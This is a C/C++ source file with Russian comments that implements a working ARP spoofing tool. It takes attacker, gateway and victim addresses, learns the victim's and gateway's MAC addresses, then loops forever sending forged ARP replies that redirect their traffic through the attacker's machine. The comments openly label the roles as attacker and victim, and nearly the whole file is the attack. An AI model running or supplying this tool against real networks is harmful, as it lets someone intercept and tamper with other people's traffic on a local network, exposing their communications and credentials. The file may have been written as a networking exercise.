#include <stdio.h>
#include <stdlib.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <net/if.h>
#include <netinet/ether.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <netpacket/packet.h>
#include <unistd.h>

#define ARP_LEN 42 // 42 байта составляют ARP запрос/ответ

// функция для формирования ARP пакетов
void create_arp (int type, char* target_ip, unsigned char* target_mac, char* src_ip, unsigned char* src_mac, unsigned char * result)
{
    if (type == 1) 
    {
        printf ("\n--------------ARP-request--------------\n");
    }
    else 
    { 
        printf ("\n--------------ARP-reply---------------\n");
    }

    struct ether_header * eth_hdr;
    struct ether_arp * arp_body;

    unsigned char buffer [ARP_LEN]; // здесь будет храниться последовательность байт пакета
    memset (buffer, 0, ARP_LEN); 

    eth_hdr = (struct ether_header *) buffer;

    // Destination MAC Address: xx xx xx xx xx xx
    // Source MAC Address:      xx xx xx xx xx xx
    // Ethernet Type:           08 06

    memcpy (eth_hdr->ether_dhost, target_mac, 6);
    memcpy (eth_hdr->ether_shost, src_mac, 6);
    eth_hdr->ether_type = htons (ETHERTYPE_ARP); // 08 06

    printf ("Destination MAC: %02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx\n", eth_hdr->ether_dhost[0], eth_hdr->ether_dhost[1], eth_hdr->ether_dhost[2], eth_hdr->ether_dhost[3], eth_hdr->ether_dhost[4], eth_hdr->ether_dhost[5]);
    printf ("Source MAC: %02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx\n", eth_hdr->ether_shost[0], eth_hdr->ether_shost[1], eth_hdr->ether_shost[2], eth_hdr->ether_shost[3], eth_hdr->ether_shost[4], eth_hdr->ether_shost[5]);
    printf ("EtherType: %04hhx\n", ntohs (eth_hdr->ether_type));
    
    arp_body = (struct ether_arp *) (buffer + sizeof (struct ether_header));

    // Hardware Type:           00 01
    // Protocol Type:           08 00
    // Hardware Address Length: 06
    // Protocol Address Length: 04
    // Operation:               00 01 или 00 02
    // Sender Hardware Address: xx xx xx xx xx xx
    // Sender Protocol Address: xx xx xx xx
    // Target Hardware Address: xx xx xx xx xx xx
    // Target Protocol Address: xx xx xx xx

    arp_body->arp_hrd = htons (ARPHRD_ETHER); // 00 01
    arp_body->arp_pro = htons (ETHERTYPE_IP); // 08 00
    arp_body->arp_hln = 6; // 06
    arp_body->arp_pln = 4; // 04
    arp_body->arp_op = htons (type); // 00 01 или 00 02
  
    struct in_addr ipformat_src, ipformat_target;

    memcpy (arp_body->arp_sha, src_mac, 6);
    inet_aton (src_ip, &ipformat_src);
    memcpy (arp_body->arp_spa, &ipformat_src, 4);

    memcpy (arp_body->arp_tha, target_mac, 6);
    inet_aton (target_ip, &ipformat_target);
    memcpy (arp_body->arp_tpa, &ipformat_target, 4);

    printf ("--------------------------------------\n");

    printf ("Hardware Type: %04hhx\n", ntohs (arp_body->arp_hrd));
    printf ("Protocol Type: %04hhx\n", ntohs (arp_body->arp_pro));
    printf ("Hardware Address Length: %d\n", arp_body->arp_hln);
    printf ("Protocol Address Length: %d\n", arp_body->arp_pln);
    printf ("Operation Code: %04hhx\n", ntohs (arp_body->arp_op));

    printf ("Sender MAC Address: %02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx\n", arp_body->arp_sha[0], arp_body->arp_sha[1], arp_body->arp_sha[2], arp_body->arp_sha[3], arp_body->arp_sha[4], arp_body->arp_sha[5]);
    memcpy (&ipformat_src, arp_body->arp_spa, 4);
    printf ("Sender IP Address: %s\n", inet_ntoa (ipformat_src));

    printf ("Target MAC Address: %02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx\n", arp_body->arp_tha[0], arp_body->arp_tha[1], arp_body->arp_tha[2], arp_body->arp_tha[3], arp_body->arp_tha[4], arp_body->arp_tha[5]);
    memcpy (&ipformat_target, arp_body->arp_tpa, 4);
    printf ("Target IP Address: %s\n", inet_ntoa (ipformat_target));

    memcpy (buffer, eth_hdr, sizeof (* eth_hdr));
    memcpy (buffer + sizeof (* eth_hdr), arp_body, sizeof (* arp_body));

    // for (int i = 0; i < ARP_LEN; i++)
    // {
    //     printf ("%02hhx ", buffer[i]);
    // }
    // printf ("\n");

    memcpy (result, buffer, sizeof(buffer));

    return;
}

// функция для отправки и принятия ARP пакетов
void arp_reply_request (int type, char * target_ip, unsigned char * target_mac, char * src_ip, unsigned char * src_mac, unsigned char * result)
{
    struct ether_header * eth_hdr;
    struct ether_arp * arp_body;

    unsigned char arp [ARP_LEN]; // здесь будет храниться строка байтов ARP запроса/ответа
    // вызываем функцию, которая сформирует строку байтов ARP запроса/ответа и запишет её в arp
    create_arp (type, target_ip, target_mac, src_ip, src_mac, arp);

    // создадим сокет (указываем, что сокет будет работать с протоколом ARP)
    int fd = socket (AF_INET, SOCK_PACKET, htons (ETH_P_ARP));
    if (fd < 0)
    {
        perror ("socket");
        exit (-1);
    }

    struct sockaddr interface;
    strcpy (interface.sa_data, "enp0s3"); // указываем наш сетевой интерфейс
    // отсылаем запрос/ответ, хранящийся в arp
    if (sendto (fd, arp, sizeof (arp), 0, &interface, sizeof (interface)) < 0)
    {
        perror ("sendto");
        exit (-1);
    }

    if (type == 1) // если это запрос то нужно получить и обработать ответ
    {
        unsigned char recv [ARP_LEN]; // здесь будет храниться ответ на наш запрос
        memset (recv, 0, ARP_LEN);

        struct sockaddr_ll recv_interface;
        socklen_t recv_interface_len = sizeof (recv_interface);
        // получаем ответный пакет
        if (recvfrom (fd, recv, ARP_LEN, 0, (struct sockaddr *) &recv_interface, &recv_interface_len) < 0)
        {
            perror ("recvfrom");
            exit (-1);
        }

        // извлекаем заголовок и тело пакета
        eth_hdr = (struct ether_header *) recv;
        arp_body = (struct ether_arp *) (recv + sizeof (struct ether_header));
        
        // если это не ARP и не ответ то не подходит
        if (ntohs (eth_hdr->ether_type) != ETH_P_ARP || ntohs (arp_body->arp_op) != ARPOP_REPLY) 
        {
            printf ("received not ARP reply!\n");
            exit (-1);
        }

        printf ("--------------------------------------\n");
        // извлекаем MAC-адрес
        unsigned char * mac = arp_body->arp_sha;
        printf ("MAC address of %s is %02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx\n", target_ip, mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

        close (fd);

        memcpy (result, mac, sizeof (mac)); // записываем MAC адрес
        return;
    }

    close (fd);
    return;
}

int main (int argc, char * argv[])
{
    // программа хочет получить на вход 4 аргумента из командной строки:
    // IP адрес злоумышленника в формате x.x.x.x (для того чтобы посылать ARP запрос и получать MAC адреса участников сети)
    // IP адрес шлюза в формате x.x.x.x
    // IP адрес жертвы в формате x.x.x.x
    // MAC адрес злоумышленника в формате xx:xx:xx:xx:xx:xx

    if (argc != 5) 
    {
        printf ("<ATTACK IP address> <GATE IP address> <VICTIM IP address> <ATTACK MAC address> arguments requiered\n");
        return -1;
    }

    char * attack_ip = argv[1];
    char * gate_ip = argv[2];
    char * victim_ip = argv[3];

    unsigned char attack_mac[6];
    if (sscanf (argv[4], "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx", &attack_mac[0], &attack_mac[1], &attack_mac[2], &attack_mac[3], &attack_mac[4], &attack_mac[5]) != 6) 
    {
        printf ("use xx:xx:xx:xx:xx:xx format for MAC address!\n");
        return -1;
    }

    // нам нужно послать ARP запросы жертве и шлюзу, чтобы они сообщили нам свои MAC адреса
    // для этого мы будем отправлять запрос на нужный IP и ff:ff:ff:ff:ff:ff

    unsigned char some_mac [] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    unsigned char victim_mac [6]; // здесь будет храниться MAC адрес жертвы
    unsigned char gate_mac [6]; // здесь будет храниться MAC адрес шлюза

    // посылаем жертве и шлюзу запросы чтобы узнать их MAC адреса

    int type = 1; // этот тип означает ARP запрос
    arp_reply_request (type, victim_ip, some_mac, attack_ip, attack_mac, victim_mac);
    arp_reply_request (type, gate_ip, some_mac, attack_ip, attack_mac, gate_mac);

    while (1)
    {   
        // посылаем жертве и шлюзу ответы с ложным MAC адресом

        type = 2; // этот тип означает ARP ответ
        arp_reply_request (type, victim_ip, victim_mac, gate_ip, attack_mac, nullptr);
        arp_reply_request (type, gate_ip, gate_mac, victim_ip, attack_mac, nullptr);
     
        sleep (20);
    }
    
    return 0;
}

